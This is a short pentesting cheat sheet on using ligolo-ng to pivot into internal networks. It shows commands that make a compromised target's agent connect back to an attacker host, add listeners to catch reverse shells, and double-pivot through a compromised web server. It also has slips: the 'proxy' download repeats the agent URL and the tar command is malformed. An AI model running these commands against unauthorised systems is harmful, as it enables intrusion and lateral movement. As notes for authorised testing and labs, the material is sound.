## Ligolo-ng

Below are the steps to setup ligolo-ng for pivoting:

```shell
# Download agent file
sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz

# Download proxy file (for attack machine)
sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz

# Extract the files
tar -xvf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz

# Create and start the tun interface
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# Start ligolo on attack machine
./proxy -selfcert -laddr 0.0.0.0:443 

# Start ligolo on target
./agent -connect <attacker_IP>:443 -ignore-cert

# Add target network to ligolo routes on attack machine
sudo ip route add <subnet> dev ligolo
```

Now start the tunnel

```shell
# Get list of active sessions and select one
ligolo > session

# Start the tunnel
ligolo > start
```

To catch reverse shells, add listeners:

```shell
# Run the agent at port 1234 and redirect
# the traffic to port 4444 on our machine.
listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
```

For double pivoting use the following commands:

```shell
# Add a new listener
listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601

# Use the IP of the compromised web server using our newly added listener.
./agent.exe -connect 172.16.5.15:11601 -ignore-cert

# Switch sessions on attack machine
ligolo > session

# Add new subnet to ligolo routes
sudo ip route add <subnet> dev ligolo
```